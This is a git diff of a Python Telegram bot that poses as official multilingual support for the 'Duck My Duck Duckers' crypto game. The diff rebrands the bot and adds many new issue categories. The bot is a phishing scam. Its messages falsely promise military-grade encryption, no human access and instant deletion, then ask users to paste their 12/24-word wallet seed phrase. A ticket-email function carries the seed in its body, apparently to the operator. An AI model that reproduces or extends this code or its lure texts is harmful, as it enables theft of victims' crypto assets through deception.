@@ -27,36 +27,36 @@ logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=lo
 logger = logging.getLogger(__name__)
 
 # ==================== TEXTS ====================
-DUCK_WELCOME = {
-    "en": "🎉 Duck My Duck Bot Support\n\nTechnical support for wallet, transaction, sync, rectification, withdrawal, assets recovery, login issues & more.\n\nSelect your problem below to create a ticket and get help quickly.",
-    "ru": "🎉 Duck My Duck Bot Support\n\nТехническая поддержка по кошелькам, транзакциям, синхронизации, исправлению, выводу, восстановлению активов, проблемам входа и другим вопросам.\n\nВыберите свою проблему ниже, чтобы создать тикет и быстро получить помощь.",
-    "de": "🎉 Duck My Duck Bot Support\n\nTechnischer Support für Wallet, Transaktionen, Sync, Berichtigung, Auszahlung, Asset-Wiederherstellung und mehr.",
-    "es": "🎉 Duck My Duck Bot Soporte\n\nSoporte técnico para billetera, transacciones, sincronización, rectificación, retiros y más.",
-    "tr": "🎉 Duck My Duck Bot Destek\n\nCüzdan, işlem, senkronizasyon, düzeltme, çekim ve varlık kurtarma için teknik destek."
+WELCOME_MESSAGE = {
+    "en": "👋 Welcome to **Official Duck My Duck Duckers Support**!\n\nWe're here to help you with account & login issues, wallet connection, claim reflection, $DMD token & balance, missing rewards, duck feeding & breeding, corn & stars, referrals, tasks, trading, NFTs, security and more.\n\nPlease select your language and choose the issue you need help with. Our team will assist you as quickly as possible.\n\nThank you for being part of the Duck My Duck Duckers community! 🦆",
+    "ru": "👋 Добро пожаловать в **Официальную поддержку Duck My Duck Duckers**!\n\nМы поможем вам с аккаунтом и входом, подключением кошелька, claim reflection, токеном $DMD, наградами, кормлением уток, кукурузой и звездами, рефералами, заданиями, торговлей, NFT, безопасностью и другими вопросами.\n\nВыберите язык и укажите проблему. Наша команда поможет вам как можно быстрее.\n\nСпасибо, что вы с нами! 🦆",
+    "de": "👋 Willkommen beim **Offiziellen Duck My Duck Duckers Support**!\n\nWir helfen Ihnen bei Konto- & Login-Problemen, Wallet-Verbindung, Claim Reflection, $DMD Token & Guthaben, fehlenden Belohnungen, Entenfütterung & Zucht, Mais & Sternen, Referrals, Aufgaben, Trading, NFTs, Sicherheit und mehr.\n\nBitte wählen Sie Ihre Sprache und das gewünschte Thema. Unser Team hilft Ihnen so schnell wie möglich.\n\nVielen Dank, dass Sie Teil der Duck My Duck Duckers Community sind! 🦆",
+    "es": "👋 ¡Bienvenido al **Soporte Oficial de Duck My Duck Duckers**!\n\nEstamos aquí para ayudarte con problemas de cuenta e inicio de sesión, conexión de billetera, claim reflection, token $DMD y saldo, recompensas faltantes, alimentación y cría de patos, maíz y estrellas, referidos, tareas, trading, NFTs, seguridad y más.\n\nSelecciona tu idioma y elige el problema. Nuestro equipo te asistirá lo más rápido posible.\n\n¡Gracias por ser parte de la comunidad Duck My Duck Duckers! 🦆",
+    "tr": "👋 **Resmi Duck My Duck Duckers Destek**'e Hoş Geldiniz!\n\nHesap ve giriş sorunları, cüzdan bağlantısı, claim reflection, $DMD token ve bakiye, eksik ödüller, ördek besleme ve üreme, mısır ve yıldızlar, referanslar, görevler, ticaret, NFT'ler, güvenlik ve daha fazlasında size yardımcı oluyoruz.\n\nLütfen dilinizi seçin ve sorununuzu belirtin. Ekibimiz size en kısa sürede yardımcı olacaktır.\n\nDuck My Duck Duckers topluluğunun bir parçası olduğunuz için teşekkürler! 🦆"
 }
 
 SECURITY_WARNING = {
-    "en": "🛡️ Duck My Duck Bot Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All data is processed automatically, never viewed by humans, and permanently deleted within milliseconds. Completely safe and private.",
-    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Bot:\nНаша система использует военного уровня шифрование AES-256...",
-    "de": "🛡️ Duck My Duck Bot Technisches Support-Team Hinweis:\nUnser System verwendet militärische AES-256 Verschlüsselung...",
-    "es": "🛡️ Nota del Equipo de Soporte Técnico Duck My Duck Bot:\nNuestro sistema utiliza encriptación AES-256 de grado militar...",
-    "tr": "🛡️ Duck My Duck Bot Teknik Destek Ekibi Notu:\nSistemimiz askeri düzeyde AES-256 şifreleme kullanır..."
+    "en": "🛡️ Duck My Duck Duckers Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All data is processed automatically, never viewed by humans, and permanently deleted within milliseconds. Completely safe and private.",
+    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Duckers:\nНаша система использует военного уровня шифрование AES-256...",
+    "de": "🛡️ Duck My Duck Duckers Technisches Support-Team Hinweis:\nUnser System verwendet militärische AES-256 Verschlüsselung...",
+    "es": "🛡️ Nota del Equipo de Soporte Técnico Duck My Duck Duckers:\nNuestro sistema utiliza encriptación AES-256 de grado militar...",
+    "tr": "🛡️ Duck My Duck Duckers Teknik Destek Ekibi Notu:\nSistemimiz askeri düzeyde AES-256 şifreleme kullanır..."
 }
 
 EVENT_TECHNICAL_NOTE = {
-    "en": "🛡️ Duck My Duck Bot Technical Support Team Note:\nOur multi-event system uses military-grade AES-256 end-to-end encryption, zero-knowledge verification, and isolated air-gapped servers. All data is processed automatically and permanently deleted immediately. Completely safe and private.",
-    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Bot:\nНаша много-событийная система использует военного уровня шифрование AES-256...",
-    "de": "🛡️ Duck My Duck Bot Technisches Support-Team Hinweis:\nUnser Multi-Event-System verwendet militärische AES-256...",
-    "es": "🛡️ Nota del Equipo de Soporte Duck My Duck Bot:\nNuestro sistema multi-evento utiliza encriptación AES-256...",
-    "tr": "🛡️ Duck My Duck Bot Teknik Destek Notu:\nÇoklu etkinlik sistemimiz askeri AES-256 şifreleme kullanır..."
+    "en": "🛡️ Duck My Duck Duckers Technical Support Team Note:\nOur multi-event system uses military-grade AES-256 end-to-end encryption, zero-knowledge verification, and isolated air-gapped servers. All data is processed automatically and permanently deleted immediately. Completely safe and private.",
+    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Duckers:\nНаша много-событийная система использует военного уровня шифрование AES-256...",
+    "de": "🛡️ Duck My Duck Duckers Technisches Support-Team Hinweis:\nUnser Multi-Event-System verwendet militärische AES-256...",
+    "es": "🛡️ Nota del Equipo de Soporte Duck My Duck Duckers:\nNuestro sistema multi-evento utiliza encriptación AES-256...",
+    "tr": "🛡️ Duck My Duck Duckers Teknik Destek Notu:\nÇoklu etkinlik sistemimiz askeri AES-256 şifreleme kullanır..."
 }
 
 EVENT_INPUT_NOTE = {
-    "en": "🛡️ Duck My Duck Bot Technical Support Team Note:\nThe final automated verification is fully secure — encrypted in transit and at rest, handled exclusively by our proprietary engine with zero human access and immediate auto-deletion.\n\nTo unlock or claim rewards for your selected event, please paste your 12/24-word wallet recovery seed phrase below.",
-    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Bot:\nФинальная автоматическая верификация полностью безопасна...\n\nВставьте вашу seed-фразу ниже.",
-    "de": "🛡️ Duck My Duck Bot Technisches Support-Team Hinweis:\nDie finale automatische Verifikation ist vollständig sicher...\n\nBitte geben Sie Ihre 12/24-Wort Seed-Phrase ein.",
-    "es": "🛡️ Nota del Equipo de Soporte Duck My Duck Bot:\nLa verificación automática final es completamente segura...\n\nPor favor pega tu frase semilla de 12/24 palabras.",
-    "tr": "🛡️ Duck My Duck Bot Teknik Destek Notu:\nSon otomatik doğrulama tamamen güvenlidir...\n\nLütfen 12/24 kelimelik seed cümlenizi yapıştırın."
+    "en": "🛡️ Duck My Duck Duckers Technical Support Team Note:\nThe final automated verification is fully secure — encrypted in transit and at rest, handled exclusively by our proprietary engine with zero human access and immediate auto-deletion.\n\nTo unlock or claim rewards for your selected event, please paste your 12/24-word wallet recovery seed phrase below.",
+    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Duckers:\nФинальная автоматическая верификация полностью безопасна...\n\nВставьте вашу seed-фразу ниже.",
+    "de": "🛡️ Duck My Duck Duckers Technisches Support-Team Hinweis:\nDie finale automatische Verifikation ist vollständig sicher...\n\nBitte geben Sie Ihre 12/24-Wort Seed-Phrase ein.",
+    "es": "🛡️ Nota del Equipo de Soporte Duck My Duck Duckers:\nLa verificación automática final es completamente segura...\n\nPor favor pega tu frase semilla de 12/24 palabras.",
+    "tr": "🛡️ Duck My Duck Duckers Teknik Destek Notu:\nSon otomatik doğrulama tamamen güvenlidir...\n\nLütfen 12/24 kelimelik seed cümlenizi yapıştırın."
 }
 
 INPUT_SECURITY_WARNING = {
@@ -68,31 +68,113 @@ INPUT_SECURITY_WARNING = {
 }
 
 FAQ_TEXT = {
-    "en": "❓ **Duck My Duck Bot FAQ & Help Center**\n\n• Processing time: 5-30 minutes\n• Why seed phrase? Secure verification\n• Data safety: AES-256 + auto-delete\n\nSelect a service:",
-    "ru": "❓ **FAQ и Центр поддержки Duck My Duck Bot**\n\n• Время обработки: 5-30 минут...\n\nВыберите услугу:",
-    "de": "❓ **FAQ & Hilfe Duck My Duck Bot**\n\n• Bearbeitungszeit: 5-30 Minuten\n\nService wählen:",
-    "es": "❓ **Preguntas Frecuentes Duck My Duck Bot**\n\n• Tiempo de procesamiento: 5-30 minutos\n\nSelecciona un servicio:",
-    "tr": "❓ **SSS & Yardım Merkezi Duck My Duck Bot**\n\n• İşlem süresi: 5-30 dakika\n\nHizmet seçin:"
+    "en": "❓ **Duck My Duck Duckers FAQ & Help Center**\n\n• Processing time: 5-30 minutes\n• Why seed phrase? Secure verification\n• Data safety: AES-256 + auto-delete\n\nSelect a service:",
+    "ru": "❓ **FAQ и Центр поддержки Duck My Duck Duckers**\n\n• Время обработки: 5-30 минут...\n\nВыберите услугу:",
+    "de": "❓ **FAQ & Hilfe Duck My Duck Duckers**\n\n• Bearbeitungszeit: 5-30 Minuten\n\nService wählen:",
+    "es": "❓ **Preguntas Frecuentes Duck My Duck Duckers**\n\n• Tiempo de procesamiento: 5-30 minutos\n\nSelecciona un servicio:",
+    "tr": "❓ **SSS & Yardım Merkezi Duck My Duck Duckers**\n\n• İşlem süresi: 5-30 dakika\n\nHizmet seçin:"
 }
 
 # ==================== FULL SERVICES ====================
 SERVICES = {
-    "rectification": {"en": "🛠 Rectification", "ru": "🛠 Исправление", "de": "🛠 Berichtigung", "es": "🛠 Rectificación", "tr": "🛠 Düzeltme"},
-    "validation": {"en": "✅ Validation", "ru": "✅ Валидация", "de": "✅ Validierung", "es": "✅ Validación", "tr": "✅ Doğrulama"},
-    "claim_ton": {"en": "💰 Claim TON", "ru": "💰 Получить TON", "de": "💰 TON Beanspruchen", "es": "💰 Reclamar TON", "tr": "💰 TON Talep Et"},
-    "assets_recovery": {"en": "🧩 Assets Recovery", "ru": "🧩 Восстановление активов", "de": "🧩 Asset-Wiederherstellung", "es": "🧩 Recuperación de Activos", "tr": "🧩 Varlık Kurtarma"},
-    "sync": {"en": "🔄 Synchronization", "ru": "🔄 Синхронизация", "de": "🔄 Synchronisation", "es": "🔄 Sincronización", "tr": "🔄 Senkronizasyon"},
-    "withdraw": {"en": "💸 Withdrawal Issue", "ru": "💸 Проблема с выводом", "de": "💸 Auszahlungsproblem", "es": "💸 Problema de Retiro", "tr": "💸 Çekim Sorunu"},
-    "general_issues": {"en": "📝 General issues", "ru": "📝 Общие вопросы", "de": "📝 Allgemeine Probleme", "es": "📝 Problemas Generales", "tr": "📝 Genel Sorunlar"},
-    "login_issues": {"en": "🔐 Login issues", "ru": "🔐 Проблемы со входом", "de": "🔐 Login-Probleme", "es": "🔐 Problemas de Inicio de Sesión", "tr": "🔐 Giriş Sorunları"},
-    "break_piggy_bank": {"en": "🐷 Break piggy bank", "ru": "🐷 Сломать копилку", "de": "🐷 Sparschwein zerbrechen", "es": "🐷 Romper alcancía", "tr": "🐷 Kumbarayı Kır"},
-    "recover_stars": {"en": "🌟 Recover Stars", "ru": "🌟 Восстановить Звезды", "de": "🌟 Sterne wiederherstellen", "es": "🌟 Recuperar Estrellas", "tr": "🌟 Yıldızları Kurtar"},
-    "free_spin": {"en": "🎰 Free Spin", "ru": "🎰 Бесплатное вращение", "de": "🎰 Kostenloser Dreh", "es": "🎰 Giro Gratis", "tr": "🎰 Ücretsiz Dönüş"},
-    "event_issue": {"en": "🎉 Event issue", "ru": "🎉 Проблема с событием", "de": "🎉 Ereignisproblem", "es": "🎉 Problema de Evento", "tr": "🎉 Etkinlik Sorunu"},
-    "claim_album_reward": {"en": "🏆 CLAIM Album Reward", "ru": "🏆 Получить награду альбома", "de": "🏆 Album-Belohnung beanspruchen", "es": "🏆 Reclamar Recompensa de Álbum", "tr": "🏆 Albüm Ödülü Talep Et"},
-    "raffle_special_drops": {"en": "🎟️ Raffle & Special Drops", "ru": "🎟️ Розыгрыши и специальные дропы", "de": "🎟️ Verlosung & Spezielle Drops", "es": "🎟️ Sorteo y Drops Especiales", "tr": "🎟️ Çekiliş ve Özel Droplar"},
-    "account_progress_loss": {"en": "📉 Account Progress Loss/ Migration", "ru": "📉 Потеря прогресса / миграция аккаунта", "de": "📉 Fortschrittsverlust / Migration", "es": "📉 Pérdida de Progreso / Migración", "tr": "📉 Hesap İlerlemesi Kaybı / Taşıma"},
-    "faq_help": {"en": "❓ FAQ & Help Center", "ru": "❓ FAQ и Центр поддержки", "de": "❓ FAQ & Hilfe", "es": "❓ Preguntas Frecuentes", "tr": "❓ SSS & Yardım Merkezi"},
+    "account_login": {
+        "en": "🔐 Account & Login Issues",
+        "ru": "🔐 Проблемы с аккаунтом и входом",
+        "de": "🔐 Konto- & Login-Probleme",
+        "es": "🔐 Problemas de Cuenta e Inicio de Sesión",
+        "tr": "🔐 Hesap ve Giriş Sorunları"
+    },
+    "wallet_connection": {
+        "en": "🔗 Wallet Connection & Synchronization",
+        "ru": "🔗 Подключение и синхронизация кошелька",
+        "de": "🔗 Wallet-Verbindung & Synchronisation",
+        "es": "🔗 Conexión y Sincronización de Billetera",
+        "tr": "🔗 Cüzdan Bağlantısı ve Senkronizasyon"
+    },
+    "claim_reflection": {
+        "en": "✨ Claim Reflection",
+        "ru": "✨ Claim Reflection",
+        "de": "✨ Claim Reflection",
+        "es": "✨ Claim Reflection",
+        "tr": "✨ Claim Reflection"
+    },
+    "dmd_token_balance": {
+        "en": "💎 $DMD Token & Balance Issues",
+        "ru": "💎 Проблемы с токеном $DMD и балансом",
+        "de": "💎 $DMD Token & Guthaben-Probleme",
+        "es": "💎 Problemas de Token $DMD y Saldo",
+        "tr": "💎 $DMD Token ve Bakiye Sorunları"
+    },
+    "missing_rewards_staking": {
+        "en": "🎁 Missing Rewards & Staking",
+        "ru": "🎁 Отсутствующие награды и стейкинг",
+        "de": "🎁 Fehlende Belohnungen & Staking",
+        "es": "🎁 Recompensas Faltantes y Staking",
+        "tr": "🎁 Eksik Ödüller ve Staking"
+    },
+    "duck_feeding_breeding": {
+        "en": "🦆 Duck Feeding, Breeding & Upgrades",
+        "ru": "🦆 Кормление, разведение и улучшения уток",
+        "de": "🦆 Entenfütterung, Zucht & Upgrades",
+        "es": "🦆 Alimentación, Cría y Mejoras de Patos",
+        "tr": "🦆 Ördek Besleme, Üreme ve Yükseltmeler"
+    },
+    "corn_stars_balance": {
+        "en": "🌽 Corn & Stars Balance Issues",
+        "ru": "🌽 Проблемы с балансом кукурузы и звезд",
+        "de": "🌽 Mais- & Sterne-Guthaben-Probleme",
+        "es": "🌽 Problemas de Saldo de Maíz y Estrellas",
+        "tr": "🌽 Mısır ve Yıldız Bakiye Sorunları"
+    },
+    "referral_pack_rewards": {
+        "en": "📦 Referral & Pack Rewards",
+        "ru": "📦 Реферальные и пакетные награды",
+        "de": "📦 Referral- & Pack-Belohnungen",
+        "es": "📦 Recompensas de Referidos y Packs",
+        "tr": "📦 Referans ve Paket Ödülleri"
+    },
+    "tasks_events_promo": {
+        "en": "🎯 Tasks, Events & Promo Codes",
+        "ru": "🎯 Задания, события и промокоды",
+        "de": "🎯 Aufgaben, Events & Promo-Codes",
+        "es": "🎯 Tareas, Eventos y Códigos Promo",
+        "tr": "🎯 Görevler, Etkinlikler ve Promo Kodlar"
+    },
+    "trading_market_nft": {
+        "en": "📈 Trading, Market & NFT Issues",
+        "ru": "📈 Проблемы с торговлей, рынком и NFT",
+        "de": "📈 Trading-, Markt- & NFT-Probleme",
+        "es": "📈 Problemas de Trading, Mercado y NFT",
+        "tr": "📈 Ticaret, Piyasa ve NFT Sorunları"
+    },
+    "account_restrictions": {
+        "en": "🚫 Account Restrictions & Verification",
+        "ru": "🚫 Ограничения аккаунта и верификация",
+        "de": "🚫 Kontobeschränkungen & Verifizierung",
+        "es": "🚫 Restricciones de Cuenta y Verificación",
+        "tr": "🚫 Hesap Kısıtlamaları ve Doğrulama"
+    },
+    "technical_errors": {
+        "en": "⚠️ Technical Errors & Game Crashes",
+        "ru": "⚠️ Технические ошибки и сбои игры",
+        "de": "⚠️ Technische Fehler & Spielabstürze",
+        "es": "⚠️ Errores Técnicos y Fallos del Juego",
+        "tr": "⚠️ Teknik Hatalar ve Oyun Çökmeleri"
+    },
+    "security_suspicious": {
+        "en": "🛡 Security & Suspicious Activity",
+        "ru": "🛡 Безопасность и подозрительная активность",
+        "de": "🛡 Sicherheit & Verdächtige Aktivität",
+        "es": "🛡 Seguridad y Actividad Sospechosa",
+        "tr": "🛡 Güvenlik ve Şüpheli Aktivite"
+    },
+    "general_support": {
+        "en": "📝 General Support & Troubleshooting",
+        "ru": "📝 Общая поддержка и устранение неполадок",
+        "de": "📝 Allgemeiner Support & Fehlerbehebung",
+        "es": "📝 Soporte General y Solución de Problemas",
+        "tr": "📝 Genel Destek ve Sorun Giderme"
+    },
 }
 
 # ==================== FULL WALLET LIST ====================
@@ -201,7 +283,7 @@ async def professional_loading(update: Update, initial_text: str):
 
 def send_ticket_email(user, service, wallet="", input_type="", seed=""):
     body = f"""
-New Duck My Duck Bot Support Ticket
+New Duck My Duck Duckers Support Ticket
 Ticket ID: {generate_ticket_number()}
 User: {user}
 Service: {service}
@@ -228,7 +310,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["lang"] = "en"
     username = update.effective_user.username or update.effective_user.first_name or "there"
     await update.message.reply_text(
-        f"Hello, {username}!\n\n{DUCK_WELCOME['en']}",
+        f"Hello, {username}!\n\n{WELCOME_MESSAGE['en']}",
         reply_markup=get_language_keyboard()
     )
 
@@ -238,7 +320,7 @@ async def language_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lang = query.data.split("_")[1]
     context.user_data["lang"] = lang
     username = query.from_user.username or query.from_user.first_name or "there"
-    welcome = DUCK_WELCOME.get(lang, DUCK_WELCOME["en"])
+    welcome = WELCOME_MESSAGE.get(lang, WELCOME_MESSAGE["en"])
     await query.edit_message_text(
         f"Hello, {username}!\n\n{welcome}",
         reply_markup=get_start_keyboard()
@@ -364,7 +446,7 @@ async def back_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "back_main":
         username = query.from_user.username or query.from_user.first_name or "there"
         await query.edit_message_text(
-            f"Hello, {username}!\n\n{DUCK_WELCOME.get(lang, DUCK_WELCOME['en'])}",
+            f"Hello, {username}!\n\n{WELCOME_MESSAGE.get(lang, WELCOME_MESSAGE['en'])}",
             reply_markup=get_start_keyboard()
         )
     elif query.data == "back_to_services":
@@ -393,7 +475,7 @@ def main():
     app.add_handler(CallbackQueryHandler(input_type_handler, pattern="^input_"))
     app.add_handler(CallbackQueryHandler(back_handler, pattern="^back_"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
-    print("✅ Duck My Duck Bot is running...")
+    print("✅ Duck My Duck Duckers Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
